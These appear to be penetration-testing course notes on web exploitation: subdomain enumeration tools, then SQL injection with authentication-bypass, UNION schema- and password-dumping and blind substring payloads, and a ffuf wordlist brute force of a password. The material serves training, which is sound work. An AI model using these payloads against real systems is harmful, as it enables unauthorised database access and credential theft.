# Exploitation

- Whenever you find an application you should look for the version number. When you find that search for the exploit.

- If you don't know what something is then you need to do the research to understand what's going on better.

## A. Web Application

### A.1. Web Application: Enumeration
***

- Leverage [HTTP Enumeration](2_Enumeration.md#https-80-8080-443)
- Enumerte for subdomains. These will be useful in finding other locations that web applications may be stored.
    - Below is a series of commands you can run to enumerate subdomains.
    - Alternatively, you can run the [domainenum.sh](../tools/domainenum.sh) script (credit to Heath Adams).
    - test, dev, and admin are some examples of potentially juicy sub domains.

````bash
# 1. Enumerate subdomains
# Assetfinder: 
assetfinder {url.com}

# Amass:
amass enum -d {url}.com}

# 2. Check if subdomains are alive with httprobe
# First you'll need to store any found subdomains in a file.

cat {name of subdomain txt file} | httprobe

# 3. Capture screenshots of the webpage to immediately find once valuable on large amounts of domains.

gowitness single {https://url.com}

````

### A.2. Web Application: Exploitation (Notes from PNPT and VHL)
***

#### A.2.A. SQL Injection
- In an SQL injection attack, the attacker modifies existing SQL queries by inserting (or ‘injecting’) specifically crafted user input which fools the system into providing more access than intended by the developers of the web application.

- Always start by fuzzing the options to check for errors:
    - Use things like single and double quotes around values.
    - Try these with known good values.
    - Try logical operators like OR and terminators like ;# or -- -
        > **WARNING**
        > ***
        > - The examples listed below could change based on the type of SQL database in use and should not be copy and pasted with expectation of immediate success.
        >   - For examples see [this cheat sheet here](https://portswigger.net/web-security/sql-injection/cheat-sheet)

    - Try to determine the kind of SQL database.
    - Must determine the total amound of columns. Use 'null' until you find the right number of columns.

- STANDARD COMMANDS

|Command        |Description                                                     |
|:--------------|:---------------------------------------------------------------|
|USE            |select the DB you would like to use.                            |
|SELECT         |extracts data from a database                                   |
|UPDATE         |updates data in a database                                      |
|DELETE         |deletes data from a database                                    |
|INSERT INTO    |inserts new data into a database                                |
|CREATE DATABASE|creates a new database                                          |
|ALTER DATABASE |modifies a database                                             |
|CREATE TABLE   |creates a new table                                             |
|ALTER TABLE    |modifies a table                                                |
|DROP TABLE     |deletes a table #Be wary of messing with this                   |
|CREATE INDEX   |creates an index (search key)                                   |
|DROP INDEX     |deletes an index                                                |
|UNION          | Used to combine the result-set of two or more SELECT statements|

_A.2.A.1. Basic SQL Injection (Form Entry)_

- Authentication bypass/dump all table values 
    - `test' or 1=1;#`

- If you receive an error try changing the limit. This will only display values up to the number listed. 
    - `test' or 1=1 LIMIT 1;#`

_A.2.A.2. SQL Injection - Union_

- These steps require some thinking on your part and can't just be copy pasted. You'll need to carefully review output and use some reasoning to determine what is standard to SQL and what is specific to the databse you're looking at. Often all of the data will appear as one and you won't be able to easily identify the information.

> **From VHL**
> ***
> The UNION operator in SQL is used to combine two or more result sets from SELECT statements. To use the UNION operator the query has to meet certain requirements:
>   - Each SELECT statement within UNION must have the same number of columns.
>   - The columns must have similar or compatible data types.
>   - The columns in each SELECT statement must be in the same order.

- Determine the number of columns. SQL won't typically dump information unless you have provided the right number of columns as values.
    - `{valid entry}' union select null, null, n*null...#`
    > **NOTE**
    > ***
    > - You can potentially use an invalid entry to figure out table names if you don't have a good known value.
    > - If the column is an integer and not a string you may need to use a number or null(int) to enumerate. Ex: `null,null(int),null,1,null`

- Determine version number of the database. THE VERSION NUMBER MUST REPLACE THE LAST SUCCESSFUL NULL VALUE, NOT ADDED TO PREVIOUS AMOUNTS OF NULL. THIS IS TRUE FOR ALL OTHER EXAMPLES BELOW.
    - `test' union select null,n*null,version()#`
    - You can dump other fields by replacing version() with:

        |Field to Enumerate|Description|
        |:-----------------|:----------|
        |@@hostname | Current Hostname |
        |@@tmpdir | Tept Directory |
        |@@datadir | Data Directory |
        |@@version | Version of DB |
        |@@basedir | Base Directory |
        |user() | Current User |
        |database() | Current Database |
        |version() | Version |
        |schema() | current Database |
        |UUID() | System UUID key |
        |current_user() | Current User|

- Determine the tables listed in the database.
    - `test' union select null,null,table_name from information_schema.tables#`

- Determine the full schema values.
    - `test' or 1=1 UNION SELECT n*null,table_schema, table_name from information_schema.tables ;#`

- Determine the column names listed in the database or specific table.
    - `test' union select null,null,column_name from information_schema.columns#`
    - `test' union select null,null,column_name from information_schema.columns where table_name='{table name}'# `

- Dump everything.
    - `test' union select table_schema,table_name,column_name from information_schema.columns where table_schema = database()` 

- **BEST OPTION** For easier viewing you can use the concat function and char(58) or ASCII for ':' to view the table and column information easier.
    -`test' union select null,null,concat(table_name,char(58),column_name) from information_schema.columns#`

- Pull specific information from a table.
    - `{valid entry you want info from like a user}' union select null,n*null, password from {table name};#`

- Pull multiple pieces of information from a table.
    -`{valid input}' union select null,null,null,concat(username,char(58),password) from injection0x03_users#`


_A.2.A.3. SQL Injection - URL_

1. Enumeration (Predefined value refers to the "?[value]=" seen in URLs when there are columns displayed) 

2. Check to see if the URL handles SQL by putting a "apostrophe" after the ?=' 

3. If its SQL check to see the amount of columns by launching Burp Suite, turn off Intercept and launch the URL against our Windows target. In the Proxy > HTTP history we should see the request we want to repeat. Send it to repeater and adjust the order by 1 value incrementally and search for error in the response window. Send each increased value request until you get a match for error in the response window EX: 1,2,n*#. The value 1 before you received the error is the amount of columns you have.

4. Enumerate even more by adding the following after the predefined value 
    > **NOTE**
    > ***
    > Like the examples above, for these to work the field has to replace one of the columns you identified. For example, doing 1,2,3,@@version when you previously identified only 3 colums would result in nothing of relevance displaying on the screen.

5. Combine methods used in union statements to view column output.

_A.2.A.4. SQL Injection - Blind_

- Blind SQL injection either gives us an error or successfully completes the request. Therefore, we can only ask the database yes or no questions to enumerate.

1. Test the application to determine regular functionality and what happens when it breaks.

2. Start burpsuite and repeat 1 to find 'Content-Length' and determine responses.

3. Attempt sql injection as listed above for enumeration and ensure that you are url encoding within burpsuite. Check things like username, password, and even the cookie. Your injection point may not just be the initial post request, but could be in redirected pages as well. The example taught in class used the get request that used the cookie.
> **NOTE**
> ***
> Always think about what the application is doing and outside the box how you can manipulate that information.

4. Enumerate yes or no with the [substring function](https://www.w3schools.com/sql/func_sqlserver_substring.asp).
    - Essentially, you're passing the request and iterating through alphanumeric characters until you get a true value (matched by either a successful content-length value or a word match on the page).
    - You can do this with intruder, SQLMap, or ffuf.
    - `{value}' and substring((select version()), 1, 1) = '8'#`
    - The command above would only return true if the first position of the version number is 8.
    - As you enumerate you can try things like: 
        - This is a proof of concept that returns true if you guess the password correctly. `' and substring((select password from injection0x02 where username = 'jeremy'), 1, 6) = 'jeremy'#`
        - Check column count. Iterate numbers till true. `' union select 1,2,3,4 limit 1#`
        - Determine length of password. `' and length((select password from injection0x02 where username = 'jeremy')) > 6#`

5. With length of password you can run ffuf to determine the password.
- Resources:
    - https://www.hackingarticles.in/comprehensive-guide-on-ffuf/
    - https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345

- Replace the password in burpsuite to 'FUZZ' and save to a text file. I'm calling mine brute.txt.

![](images/fuzz_brute.png)

- You can create a password file if you know the length with:

````bash
cat /usr/share/wordlists/rockyou.txt | awk 'length($0) == 6' > pass.txt
#You can use any other seclist
````
- Run the command:

````bash
ffuf -request brute.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZ -ms 1027

#[-request] is the request from burpsuite. Using this options means we don't need to use a url.
#[-request-proto http] chooses the type
#[-ms] filters our response to the content-length we know is a good value.
#[-w pass.txt:FUZZ] tells ffuf which wordlist to use for which parameter. For this example i just tested with known values.
````
- You will see from the results that SQL is not case sensitive so you'll need to test different values for success.

![](images/ffuf_results.png)

#### A.2.B. Cross-Site Scripting (XSS)





